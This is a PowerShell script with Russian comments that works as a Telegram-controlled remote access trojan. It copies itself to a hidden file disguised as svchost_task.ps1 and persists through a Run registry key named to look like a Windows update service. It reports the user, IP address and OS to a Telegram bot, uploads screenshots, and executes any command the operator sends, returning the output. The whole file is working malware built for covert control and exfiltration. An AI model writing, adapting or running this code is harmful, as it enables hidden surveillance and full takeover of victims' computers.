# Ссылка на этот же файл (RAW), чтобы он мог себя перекачать для закрепления
$url_raw = "https://raw.githubusercontent.com/tidomail13719-art/safe-test-/main/test"

# Пути для маскировки
$dir = "$env:APPDATA\WindowsNT"
$file = "$dir\svchost_task.ps1"
$reg_name = "WindowsUpdateService"

# --- [ 1. СКРЫТАЯ УСТАНОВКА И ЗАКРЕПЛЕНИЕ ] ---
if ($PSCommandPath -ne $file) {
    try {
        if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
        (New-Object Net.WebClient).DownloadFile($url_raw, $file)
        (Get-Item $file).Attributes = 'Hidden'
        
        # Прописка в реестр (автозапуск при старте Windows)
        $cmd_line = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$file`""
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $reg_name -Value $cmd_line
    } catch { }
}

# --- [ 2. ФУНКЦИИ УПРАВЛЕНИЯ ] ---
function Send-TG ($text) {
    $url = "https://api.telegram.org/bot$token/sendMessage"
    $body = @{ chat_id = $admin_id; text = "[$env:COMPUTERNAME] $text"; parse_mode = "Markdown" }
    Invoke-RestMethod -Uri $url -Method Post -Body $body
}

function Get-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $screen = [Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $path = "$env:TEMP\sys_temp_log.png"
        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose(); $bmp.Dispose()
        
        # Отправка фото через curl (он есть во всех новых Windows)
        curl.exe -F "chat_id=$admin_id" -F "photo=@$path" "https://api.telegram.org/bot$token/sendPhoto"
        Remove-Item $path
    } catch { Send-TG "❌ Ошибка скриншота: $_" }
}

# --- [ 3. ПРИВЕТСТВИЕ (ИНФО О СИСТЕМЕ) ] ---
$ip = (Invoke-RestMethod "http://ip-api.com/json").query
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$sysinfo = "🚀 **АГЕНТ АКТИВИРОВАН!**`n👤 Юзер: $env:USERNAME`n🌐 IP: $ip`n⚙️ ОС: $os`n📂 Путь: $file"
Send-TG $sysinfo

# --- [ 4. ОСНОВНОЙ ЦИКЛ ОБРАБОТКИ КОМАНД ] ---
$last_id = 0
while($true) {
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$token/getUpdates?offset=$($last_id + 1)&timeout=20"
        foreach ($upd in $updates.result) {
            $last_id = $upd.update_id
            if ($upd.message.from.id -eq $admin_id) {
                $cmd = $upd.message.text
                
                if ($cmd -eq "shot") { 
                    Get-Screenshot 
                }
                elseif ($cmd -eq "info") {
                    $mem = (Get-WmiObject Win32_OperatingSystem).FreePhysicalMemory
                    Send-TG "📊 Свободно памяти: $($mem / 1024) MB"
                }
                elseif ($cmd -eq "kill") {
                    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $reg_name
                    Send-TG "💀 Самоликвидация выполнена. Скрипт удален из автозагрузки."; exit
                }
                else {
                    # Выполнение любой системной команды (dir, whoami, и т.д.)
                    $out = iex $cmd 2>&1 | Out-String
                    if ($out) { Send-TG "📄 Ответ:`n ```$out``` " }
                    else { Send-TG "✅ Команда выполнена." }
                }
            }
        }
    } catch { Start-Sleep -Seconds 5 }
    Start-Sleep -Seconds 2
}
